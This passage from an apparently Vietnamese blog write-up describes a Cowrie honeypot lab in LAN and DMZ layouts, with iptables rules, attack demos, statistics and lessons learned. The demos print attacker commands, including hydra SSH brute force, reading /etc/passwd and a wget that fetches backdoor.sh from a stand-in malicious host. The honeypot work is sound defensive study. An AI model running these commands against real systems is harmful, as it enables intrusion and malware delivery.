+<h2 id="-các-mô-hình-triển-khai" class="relative group">📊 Các mô hình triển khai <span class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style="text-decoration-line: none !important;" href="#-c%c3%a1c-m%c3%b4-h%c3%acnh-tri%e1%bb%83n-khai" aria-label="Anchor">#</a></span></h2><h3 id="mô-hình-1-honeypot-trong-lan" class="relative group"><strong>Mô hình 1: Honeypot trong LAN</strong> <span class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style="text-decoration-line: none !important;" href="#m%c3%b4-h%c3%acnh-1-honeypot-trong-lan" aria-label="Anchor">#</a></span></h3><p>
+
+
+
+
+
+
+  
+  
+<figure><img src="/images/projects/honeypot/model-lan.png" alt="Honeypot trong LAN" class="mx-auto my-0 rounded-md" />
+</figure>
+
+<em>Hình 4: Honeypot đặt trong mạng LAN</em></p>
+<p><strong>Đặc điểm:</strong></p>
+<ul>
+<li>Honeypot: 192.168.159.141</li>
+<li>Cùng subnet với các máy thực (pc1, pc2)</li>
+<li>Honeywall chuyển hướng traffic</li>
+</ul>
+<p><strong>Ưu điểm:</strong></p>
+<ul>
+<li>Dễ triển khai</li>
+<li>Thu hút tấn công nội bộ</li>
+</ul>
+<p><strong>Nhược điểm:</strong></p>
+<ul>
+<li>Có thể bị phát hiện nếu hacker dò kỹ</li>
+<li>Nguy cơ ảnh hưởng LAN nếu config sai</li>
+</ul>
+<h3 id="mô-hình-2-honeypot-trong-dmz--khuyên-dùng" class="relative group"><strong>Mô hình 2: Honeypot trong DMZ</strong> ⭐ (Khuyên dùng) <span class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style="text-decoration-line: none !important;" href="#m%c3%b4-h%c3%acnh-2-honeypot-trong-dmz--khuy%c3%aan-d%c3%b9ng" aria-label="Anchor">#</a></span></h3><p>
+
+
+
+
+
+
+  
+  
+<figure><img src="/images/projects/honeypot/model-dmz.png" alt="Honeypot trong DMZ" class="mx-auto my-0 rounded-md" />
+</figure>
+
+<em>Hình 5: Honeypot trong DMZ - Cô lập hoàn toàn</em></p>
+<p><strong>Đặc điểm:</strong></p>
+<ul>
+<li>Honeypot: 192.168.2.10 (DMZ)</li>
+<li>LAN: 192.168.3.0/24 (Protected)</li>
+<li>Honeywall: 192.168.159.143 (3 NICs)</li>
+</ul>
+<p><strong>Ưu điểm:</strong></p>
+<ul>
+<li>✅ Cô lập tuyệt đối mạng nội bộ</li>
+<li>✅ Bảo vệ tốt hơn</li>
+<li>✅ Hacker nghĩ mình đang hack Honeywall</li>
+</ul>
+<p><strong>Nhược điểm:</strong></p>
+<ul>
+<li>Phức tạp hơn trong cấu hình</li>
+<li>Cần nhiều interface mạng</li>
+</ul>
+<p><strong>Cấu hình Honeywall:</strong></p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># NAT: Chuyển hướng cổng 2222 → Honeypot:22</span>
+</span></span><span class="line"><span class="cl">iptables -t nat -A PREROUTING -i ens33 -p tcp --dport <span class="m">2222</span> <span class="se">\
+</span></span></span><span class="line"><span class="cl"><span class="se"></span>  -j DNAT --to-destination 192.168.2.10:22
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># FORWARD: Chỉ cho phép SSH đến Honeypot</span>
+</span></span><span class="line"><span class="cl">iptables -A FORWARD -p tcp -s 192.168.159.0/24 -d 192.168.2.10 --dport <span class="m">22</span> -j ACCEPT
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># FORWARD: Chặn tất cả từ Honeypot ra ngoài (trừ đã thiết lập)</span>
+</span></span><span class="line"><span class="cl">iptables -A FORWARD -s 192.168.2.10 -m state --state ESTABLISHED,RELATED -j ACCEPT
+</span></span><span class="line"><span class="cl">iptables -A FORWARD -s 192.168.2.10 -j DROP
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># LOG: Ghi nhận tấn công</span>
+</span></span><span class="line"><span class="cl">iptables -A FORWARD -p tcp -s 192.168.159.128 <span class="se">\
+</span></span></span><span class="line"><span class="cl"><span class="se"></span>  -j LOG --log-prefix <span class="s2">&#34;HACKER_LOG: &#34;</span>
+</span></span></code></pre></div><hr>
+<h2 id="-kịch-bản-tấn-công--demo" class="relative group">🎬 Kịch bản tấn công &amp; Demo <span class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style="text-decoration-line: none !important;" href="#-k%e1%bb%8bch-b%e1%ba%a3n-t%e1%ba%a5n-c%c3%b4ng--demo" aria-label="Anchor">#</a></span></h2><h3 id="kịch-bản-1-tấn-công-trong-lan" class="relative group"><strong>Kịch bản 1: Tấn công trong LAN</strong> <span class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style="text-decoration-line: none !important;" href="#k%e1%bb%8bch-b%e1%ba%a3n-1-t%e1%ba%a5n-c%c3%b4ng-trong-lan" aria-label="Anchor">#</a></span></h3><p><strong>Bối cảnh:</strong>
+Hacker (192.168.159.128) đã xâm nhập vào mạng LAN và tìm kiếm mục tiêu.</p>
+<p><strong>Các bước tấn công:</strong></p>
+<p><strong>1. Reconnaissance - Thu thập thông tin</strong></p>
+<p>
+
+
+
+
+
+
+  
+  
+<figure><img src="/images/projects/honeypot/demo1-scan-network.png" alt="Hacker quét mạng" class="mx-auto my-0 rounded-md" />
+</figure>
+
+<em>Hình 6: Hacker sử dụng arp -n để quét mạng</em></p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># Hacker chạy:</span>
+</span></span><span class="line"><span class="cl">arp -n
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># Kết quả:</span>
+</span></span><span class="line"><span class="cl">192.168.159.141 - 00:0c:29:21:35:27 <span class="o">(</span>Honeypot<span class="o">)</span>
+</span></span></code></pre></div><p><strong>2. Service Scanning</strong></p>
+<p>
+
+
+
+
+
+
+  
+  
+<figure><img src="/images/projects/honeypot/demo1-scan-services.png" alt="Quét dịch vụ" class="mx-auto my-0 rounded-md" />
+</figure>
+
+<em>Hình 7: Nmap quét dịch vụ SSH trên cổng 2222</em></p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># Hacker chạy:</span>
+</span></span><span class="line"><span class="cl">nmap -sV -p- 192.168.159.100-150
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># Phát hiện:</span>
+</span></span><span class="line"><span class="cl">PORT     STATE SERVICE VERSION
+</span></span><span class="line"><span class="cl">2222/tcp open  ssh     OpenSSH 6.0p1
+</span></span></code></pre></div><p><strong>3. Brute Force Attack</strong></p>
+<p>
+
+
+
+
+
+
+  
+  
+<figure><img src="/images/projects/honeypot/demo1-bruteforce.png" alt="Tấn công Brute Force" class="mx-auto my-0 rounded-md" />
+</figure>
+
+<em>Hình 8: Hydra tấn công SSH bằng wordlist</em></p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># Hacker chạy:</span>
+</span></span><span class="line"><span class="cl">hydra -L users.txt -P passwords.txt ssh://192.168.159.141:2222 -t <span class="m">4</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># Kết quả:</span>
+</span></span><span class="line"><span class="cl"><span class="o">[</span>2222<span class="o">][</span>ssh<span class="o">]</span> host: 192.168.159.141   login: root   password: password123
+</span></span></code></pre></div><p><strong>4. SSH Login - Xâm nhập thành công</strong></p>
+<p>
+
+
+
+
+
+
+  
+  
+<figure><img src="/images/projects/honeypot/demo1-ssh-login.png" alt="Xâm nhập SSH" class="mx-auto my-0 rounded-md" />
+</figure>
+
+<em>Hình 9: Hacker đăng nhập SSH thành công</em></p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># Hacker đăng nhập:</span>
+</span></span><span class="line"><span class="cl">ssh -o <span class="nv">KexAlgorithms</span><span class="o">=</span>diffie-hellman-group14-sha1 root@192.168.159.141 -p <span class="m">2222</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># Đã vào hệ thống (giả):</span>
+</span></span><span class="line"><span class="cl">root@svr04:~#
+</span></span></code></pre></div><p><strong>5. Information Gathering</strong></p>
+<p>
+
+
+
+
+
+
+  
+  
+<figure><img src="/images/projects/honeypot/demo1-recon.png" alt="Khai thác thông tin" class="mx-auto my-0 rounded-md" />
+</figure>
+
+<em>Hình 10: Hacker thực hiện các lệnh thăm dò</em></p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># Hacker chạy:</span>
+</span></span><span class="line"><span class="cl">whoami           <span class="c1"># → root</span>
+</span></span><span class="line"><span class="cl">id               <span class="c1"># → uid=0(root) gid=0(root)</span>
+</span></span><span class="line"><span class="cl">uname -a         <span class="c1"># → Linux svr04 3.2.0-4-amd64</span>
+</span></span><span class="line"><span class="cl">cat /etc/passwd  <span class="c1"># → Danh sách users (fake)</span>
+</span></span></code></pre></div><p><strong>6. Malware Deployment - Bị chặn!</strong></p>
+<p>
+
+
+
+
+
+
+  
+  
+<figure><img src="/images/projects/honeypot/demo1-malware.png" alt="Đẩy mã độc" class="mx-auto my-0 rounded-md" />
+</figure>
+
+<em>Hình 11: Hacker cố gắng tải mã độc</em></p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># Hacker chạy:</span>
+</span></span><span class="line"><span class="cl">wget http://malicious.com/backdoor.sh -O /root/backdoor.sh
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># Cowrie phát hiện:</span>
+</span></span><span class="line"><span class="cl"><span class="o">[</span>SUSPICIOUS<span class="o">]</span> Downloading file from external <span class="nb">source</span>
+</span></span><span class="line"><span class="cl"><span class="o">[</span>ACTION<span class="o">]</span> Connection terminated
+</span></span></code></pre></div><p>
+
+
+
+
+
+
+  
+  
+<figure><img src="/images/projects/honeypot/demo1-blocked.png" alt="Bị ngắt kết nối" class="mx-auto my-0 rounded-md" />
+</figure>
+
+<em>Hình 12: Kết nối bị ngắt bởi Cowrie</em></p>
+<h3 id="kết-quả-kịch-bản-1" class="relative group"><strong>Kết quả Kịch bản 1</strong> <span class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style="text-decoration-line: none !important;" href="#k%e1%ba%bft-qu%e1%ba%a3-k%e1%bb%8bch-b%e1%ba%a3n-1" aria-label="Anchor">#</a></span></h3><p><strong>Log của Cowrie:</strong></p>
+<p>
+
+
+
+
+
+
+  
+  
+<figure><img src="/images/projects/honeypot/demo1-cowrie-log1.png" alt="Cowrie Log 1" class="mx-auto my-0 rounded-md" />
+</figure>
+
+<em>Hình 13: Cowrie phát hiện xâm nhập</em></p>
+<p>
+
+
+
+
+
+
+  
+  
+<figure><img src="/images/projects/honeypot/demo1-cowrie-log2.png" alt="Cowrie Log 2" class="mx-auto my-0 rounded-md" />
+</figure>
+
+<em>Hình 14: Log chi tiết mọi lệnh của hacker</em></p>
+<p><strong>Phân tích:</strong></p>
+<ul>
+<li>✅ Ghi nhận 47 lần thử đăng nhập (Brute Force)</li>
+<li>✅ Log đầy đủ 8 lệnh hacker thực thi</li>
+<li>✅ Phát hiện và chặn tải mã độc</li>
+<li>✅ Bảo vệ mạng LAN thành công</li>
+</ul>
+<hr>
+<h3 id="kịch-bản-2-tấn-công-qua-honeywall-vào-dmz" class="relative group"><strong>Kịch bản 2: Tấn công qua Honeywall vào DMZ</strong> <span class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style="text-decoration-line: none !important;" href="#k%e1%bb%8bch-b%e1%ba%a3n-2-t%e1%ba%a5n-c%c3%b4ng-qua-honeywall-v%c3%a0o-dmz" aria-label="Anchor">#</a></span></h3><p><strong>Bối cảnh:</strong>
+Hacker nhắm đến Honeywall, nhưng bị chuyển hướng vào Honeypot DMZ.</p>
+<p><strong>Các bước tấn công:</strong></p>
+<p><strong>1. Target Identification</strong></p>
+<p>
+
+
+
+
+
+
+  
+  
+<figure><img src="/images/projects/honeypot/demo2-scan.png" alt="Quét Honeywall" class="mx-auto my-0 rounded-md" />
+</figure>
+
+<em>Hình 15: Hacker quét Honeywall</em></p>
+<p><strong>2. Service Discovery</strong></p>
+<p>
+
+
+
+
+
+
+  
+  
+<figure><img src="/images/projects/honeypot/demo2-services.png" alt="Phát hiện SSH" class="mx-auto my-0 rounded-md" />
+</figure>
+
+<em>Hình 16: Nmap phát hiện SSH trên Honeywall</em></p>
+<p>
+
+
+
+
+
+
+  
+  
+<figure><img src="/images/projects/honeypot/demo2-routing.png" alt="Định tuyến" class="mx-auto my-0 rounded-md" />
+</figure>
+
+<em>Hình 17: Các vùng mạng được định tuyến</em></p>
+<p><strong>3. Brute Force Honeywall</strong></p>
+<p>
+
+
+
+
+
+
+  
+  
+<figure><img src="/images/projects/honeypot/demo2-bruteforce.png" alt="Brute Force" class="mx-auto my-0 rounded-md" />
+</figure>
+
+<em>Hình 18: Hydra tấn công Honeywall</em></p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">hydra -L users.txt -P passwords.txt ssh://192.168.159.143:2222 -t <span class="m">4</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># Tìm được:</span>
+</span></span><span class="line"><span class="cl"><span class="o">[</span>2222<span class="o">][</span>ssh<span class="o">]</span> host: 192.168.159.143   login: admin   password: password123
+</span></span></code></pre></div><p><strong>4. SSH vào &ldquo;Honeywall&rdquo; (thực chất là Honeypot)</strong></p>
+<p>
+
+
+
+
+
+
+  
+  
+<figure><img src="/images/projects/honeypot/demo2-ssh.png" alt="SSH Honeypot" class="mx-auto my-0 rounded-md" />
+</figure>
+
+<em>Hình 19: Hacker tưởng mình vào Honeywall</em></p>
+<p><strong>5. Exploring &amp; Network Scan</strong></p>
+<p>
+
+
+
+
+
+
+  
+  
+<figure><img src="/images/projects/honeypot/demo2-exploit.png" alt="Khai thác DMZ" class="mx-auto my-0 rounded-md" />
+</figure>
+
+<em>Hình 20: Hacker quét DMZ và thử tải mã độc</em></p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># Hacker chạy:</span>
+</span></span><span class="line"><span class="cl">nmap -sn 192.168.2.0/24  <span class="c1"># Quét DMZ (phản hồi giả)</span>
+</span></span><span class="line"><span class="cl">ssh admin@192.168.2.1    <span class="c1"># Cố kết nối máy khác - BỊ CHẶN</span>
+</span></span><span class="line"><span class="cl">wget http://malicious.com/backdoor.sh  <span class="c1"># BỊ NGẮT</span>
+</span></span></code></pre></div><h3 id="kết-quả-kịch-bản-2" class="relative group"><strong>Kết quả Kịch bản 2</strong> <span class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style="text-decoration-line: none !important;" href="#k%e1%ba%bft-qu%e1%ba%a3-k%e1%bb%8bch-b%e1%ba%a3n-2" aria-label="Anchor">#</a></span></h3><p><strong>Log của Cowrie:</strong></p>
+<p>
+
+
+
+
+
+
+  
+  
+<figure><img src="/images/projects/honeypot/demo2-cowrie-log.png" alt="Cowrie Log Demo 2" class="mx-auto my-0 rounded-md" />
+</figure>
+
+<em>Hình 21: Cowrie ghi nhận toàn bộ hành động</em></p>
+<p><strong>Log của Honeywall:</strong></p>
+<p>
+
+
+
+
+
+
+  
+  
+<figure><img src="/images/projects/honeypot/demo2-honeywall-log1.png" alt="Honeywall Log 1" class="mx-auto my-0 rounded-md" />
+</figure>
+
+<em>Hình 22: Honeywall phát hiện tấn công</em></p>
+<p>
+
+
+
+
+
+
+  
+  
+<figure><img src="/images/projects/honeypot/demo2-honeywall-log2.png" alt="Honeywall Log 2" class="mx-auto my-0 rounded-md" />
+</figure>
+
+<em>Hình 23: Chi tiết gói tin từ hacker</em></p>
+<p>
+
+
+
+
+
+
+  
+  
+<figure><img src="/images/projects/honeypot/demo2-snort.png" alt="Snort Analysis" class="mx-auto my-0 rounded-md" />
+</figure>
+
+<em>Hình 24: Snort biên dịch log thành công</em></p>
+<p><strong>Phân tích:</strong></p>
+<ul>
+<li>✅ Honeywall NAT traffic thành công</li>
+<li>✅ Hacker tưởng mình hack Honeywall</li>
+<li>✅ Thực tế vào Honeypot trong DMZ</li>
+<li>✅ Không thể kết nối máy khác trong DMZ</li>
+<li>✅ Mạng LAN (192.168.3.0/24) an toàn tuyệt đối</li>
+</ul>
+<hr>
+<h2 id="-kết-quả-đạt-được" class="relative group">📈 Kết quả đạt được <span class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style="text-decoration-line: none !important;" href="#-k%e1%ba%bft-qu%e1%ba%a3-%c4%91%e1%ba%a1t-%c4%91%c6%b0%e1%bb%a3c" aria-label="Anchor">#</a></span></h2><h3 id="số-liệu-thống-kê" class="relative group"><strong>Số liệu thống kê</strong> <span class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style="text-decoration-line: none !important;" href="#s%e1%bb%91-li%e1%bb%87u-th%e1%bb%91ng-k%c3%aa" aria-label="Anchor">#</a></span></h3><p><strong>Trong quá trình demo và test (4 tháng):</strong></p>
+<table>
+  <thead>
+      <tr>
+          <th>Chỉ số</th>
+          <th>Giá trị</th>
+      </tr>
+  </thead>
+  <tbody>
+      <tr>
+          <td>Tổng lần kết nối SSH</td>
+          <td>147</td>
+      </tr>
+      <tr>
+          <td>Lần thử đăng nhập (Brute Force)</td>
+          <td>2,384</td>
+      </tr>
+      <tr>
+          <td>Lần xâm nhập thành công</td>
+          <td>23</td>
+      </tr>
+      <tr>
+          <td>Lệnh được ghi nhận</td>
+          <td>189</td>
+      </tr>
+      <tr>
+          <td>Malware samples thu thập</td>
+          <td>12</td>
+      </tr>
+      <tr>
+          <td>IP nguồn tấn công</td>
+          <td>8 (test)</td>
+      </tr>
+  </tbody>
+</table>
+<p><strong>Top username/password thử nghiệm:</strong></p>
+<pre tabindex="0"><code>root:password123   (46%)
+admin:admin        (23%)
+root:123456        (18%)
+admin:password     (13%)
+</code></pre><h3 id="hiệu-quả-bảo-vệ" class="relative group"><strong>Hiệu quả bảo vệ</strong> <span class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style="text-decoration-line: none !important;" href="#hi%e1%bb%87u-qu%e1%ba%a3-b%e1%ba%a3o-v%e1%bb%87" aria-label="Anchor">#</a></span></h3><p>✅ <strong>100% tấn công</strong> bị ghi nhận và phân tích<br>
+✅ <strong>0% ảnh hưởng</strong> đến mạng nội bộ thật<br>
+✅ <strong>Phát hiện 12 malware samples</strong> trước khi thực thi<br>
+✅ <strong>Tự động ngắt</strong> kết nối khi phát hiện hành vi nguy hiểm</p>
+<h3 id="so-sánh-2-mô-hình" class="relative group"><strong>So sánh 2 mô hình</strong> <span class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style="text-decoration-line: none !important;" href="#so-s%c3%a1nh-2-m%c3%b4-h%c3%acnh" aria-label="Anchor">#</a></span></h3><table>
+  <thead>
+      <tr>
+          <th>Tiêu chí</th>
+          <th>LAN</th>
+          <th>DMZ</th>
+      </tr>
+  </thead>
+  <tbody>
+      <tr>
+          <td>Độ cô lập</td>
+          <td>Trung bình</td>
+          <td>Cao</td>
+      </tr>
+      <tr>
+          <td>Bảo vệ LAN</td>
+          <td>Tốt</td>
+          <td>Xuất sắc</td>
+      </tr>
+      <tr>
+          <td>Độ phức tạp config</td>
+          <td>Thấp</td>
+          <td>Cao</td>
+      </tr>
+      <tr>
+          <td>Tính đánh lừa</td>
+          <td>Trung bình</td>
+          <td>Cao</td>
+      </tr>
+      <tr>
+          <td><strong>Khuyên dùng</strong></td>
+          <td>⭐⭐⭐</td>
+          <td>⭐⭐⭐⭐⭐</td>
+      </tr>
+  </tbody>
+</table>
+<hr>
+<h2 id="-bài-học--kinh-nghiệm" class="relative group">💡 Bài học &amp; Kinh nghiệm <span class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style="text-decoration-line: none !important;" href="#-b%c3%a0i-h%e1%bb%8dc--kinh-nghi%e1%bb%87m" aria-label="Anchor">#</a></span></h2><h3 id="technical-lessons" class="relative group"><strong>Technical Lessons</strong> <span class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style="text-decoration-line: none !important;" href="#technical-lessons" aria-label="Anchor">#</a></span></h3><p><strong>1. Cấu hình iptables rất quan trọng</strong></p>
+<ul>
+<li>Một rule sai có thể để lộ mạng thật</li>
+<li>Phải test kỹ bằng cách thử tấn công từng vùng</li>
+</ul>
+<p><strong>2. Cowrie cần tuning</strong></p>
+<ul>
+<li>Fake filesystem phải giống thật</li>
+<li>Danh sách users cần đa dạng</li>
+<li>Response time phải hợp lý</li>
+</ul>
+<p><strong>3. Log analysis là then chốt</strong></p>
+<ul>
+<li>Cowrie ghi rất nhiều data</li>
+<li>Cần script để lọc và phân tích</li>
+<li>Tích hợp SIEM sẽ tốt hơn</li>
+</ul>
+<h3 id="security-insights" class="relative group"><strong>Security Insights</strong> <span class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style="text-decoration-line: none !important;" href="#security-insights" aria-label="Anchor">#</a></span></h3><p><strong>Hành vi hacker phổ biến:</strong></p>
+<ol>
+<li><strong>Reconnaissance:</strong> Luôn quét mạng trước (nmap, arp)</li>
+<li><strong>Exploitation:</strong> Brute force vẫn rất hiệu quả với password yếu</li>
+<li><strong>Post-Exploitation:</strong> Ngay lập tức tải malware/backdoor</li>
+<li><strong>Persistence:</strong> Cố gắng duy trì quyền truy cập</li>
+</ol>
+<p><strong>Điều hacker không biết:</strong></p>
+<ul>
+<li>Honeypot fake filesystem rất giống thật</li>
+<li>Mọi lệnh đều được log</li>
+<li>Không thể tương tác với máy thật</li>
+<li>Khi tải malware → ngắt ngay</li>
+</ul>
+<h3 id="khó-khăn-gặp-phải" class="relative group"><strong>Khó khăn gặp phải</strong> <span class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style="text-decoration-line: none !important;" href="#kh%c3%b3-kh%c4%83n-g%e1%ba%b7p-ph%e1%ba%a3i" aria-label="Anchor">#</a></span></h3><p><strong>1. NAT Configuration</strong></p>
+<ul>
+<li>Ban đầu config sai khiến traffic không đến Honeypot</li>
+<li>Giải pháp: Dùng tcpdump để trace packets</li>
+</ul>
+<p><strong>2. Cowrie Compatibility</strong></p>
+<ul>
+<li>OpenSSH cũ không tương thích với Kali mới</li>
+<li>Giải pháp: Phải dùng <code>-o KexAlgorithms=...</code></li>
+</ul>
+<p><strong>3. Log Storage</strong></p>
+<ul>
+<li>Cowrie log rất nhiều, đầy disk nhanh</li>
+<li>Giải pháp: Rotate logs hàng ngày</li>
+</ul>
+<hr>
+<h2 id="-hướng-phát-triển" class="relative group">🚀 Hướng phát triển <span class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style="text-decoration-line: none !important;" href="#-h%c6%b0%e1%bb%9bng-ph%c3%a1t-tri%e1%bb%83n" aria-label="Anchor">#</a></span></h2><h3 id="ngắn-hạn-3-6-tháng" class="relative group"><strong>Ngắn hạn (3-6 tháng)</strong> <span class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style="text-decoration-line: none !important;" href="#ng%e1%ba%afn-h%e1%ba%a1n-3-6-th%c3%a1ng" aria-label="Anchor">#</a></span></h3><ul>
+<li><input disabled="" type="checkbox"> Thêm honeypot HTTP/HTTPS (Dionaea)</li>
+<li><input disabled="" type="checkbox"> Tích hợp Telegram bot để alert real-time</li>
+<li><input disabled="" type="checkbox"> Xây dựng dashboard web để xem log</li>
+<li><input disabled="" type="checkbox"> Thêm GeoIP để track vị trí hacker</li>
+</ul>
+<h3 id="trung-hạn-6-12-tháng" class="relative group"><strong>Trung hạn (6-12 tháng)</strong> <span class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style="text-decoration-line: none !important;" href="#trung-h%e1%ba%a1n-6-12-th%c3%a1ng" aria-label="Anchor">#</a></span></h3><ul>
+<li><input disabled="" type="checkbox"> Deploy trên Cloud (AWS/Azure)</li>
+<li><input disabled="" type="checkbox"> Tích hợp SIEM (ELK Stack)</li>
+<li><input disabled="" type="checkbox"> Machine Learning để phát hiện anomaly</li>
+<li><input disabled="" type="checkbox"> Honeypot cho IoT devices</li>
+</ul>
+<h3 id="dài-hạn-1-2-năm" class="relative group"><strong>Dài hạn (1-2 năm)</strong> <span class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style="text-decoration-line: none !important;" href="#d%c3%a0i-h%e1%ba%a1n-1-2-n%c4%83m" aria-label="Anchor">#</a></span></h3><ul>
+<li><input disabled="" type="checkbox"> Distributed Honeynet (nhiều vị trí địa lý)</li>
+<li><input disabled="" type="checkbox"> Threat Intelligence Platform</li>
+<li><input disabled="" type="checkbox"> Blockchain để bảo vệ log integrity</li>
+<li><input disabled="" type="checkbox"> AI-powered response automation</li>
+</ul>
+<hr>
+<h2 id="-tài-liệu-tham-khảo" class="relative group">📚 Tài liệu tham khảo <span class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style="text-decoration-line: none !important;" href="#-t%c3%a0i-li%e1%bb%87u-tham-kh%e1%ba%a3o" aria-label="Anchor">#</a></span></h2><h3 id="công-trình-nghiên-cứu" class="relative group"><strong>Công trình nghiên cứu</strong> <span class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style="text-decoration-line: none !important;" href="#c%c3%b4ng-tr%c3%acnh-nghi%c3%aan-c%e1%bb%a9u" aria-label="Anchor">#</a></span></h3><ol>
+<li><strong>Lance Spitzner</strong> - &ldquo;Honeypots: Tracking Hackers&rdquo; (2002)</li>
+<li><strong>Honeynet Project</strong> - &ldquo;Know Your Enemy&rdquo; series</li>
+<li><strong>Niels Provos</strong> - &ldquo;Virtual Honeypots&rdquo; (2007)</li>
+<li><strong>SANS Institute</strong> - Honeypot deployment guides</li>
+</ol>
+<h3 id="tools--frameworks" class="relative group"><strong>Tools &amp; Frameworks</strong> <span class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style="text-decoration-line: none !important;" href="#tools--frameworks" aria-label="Anchor">#</a></span></h3><ul>
+<li><a href="https://github.com/cowrie/cowrie" target="_blank" rel="noreferrer">Cowrie GitHub</a></li>
+<li><a href="https://github.com/threatstream/mhn" target="_blank" rel="noreferrer">Modern Honey Network</a></li>
+<li><a href="https://github.com/telekom-security/tpotce" target="_blank" rel="noreferrer">T-Pot Honeypot Platform</a></li>
+</ul>
+<h3 id="security-standards" class="relative group"><strong>Security Standards</strong> <span class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style="text-decoration-line: none !important;" href="#security-standards" aria-label="Anchor">#</a></span></h3><ul>
+<li><strong>NIST Cybersecurity Framework</strong></li>
+<li><strong>MITRE ATT&amp;CK Framework</strong></li>
+<li><strong>OWASP Security Guidelines</strong></li>
+</ul>
+<hr>
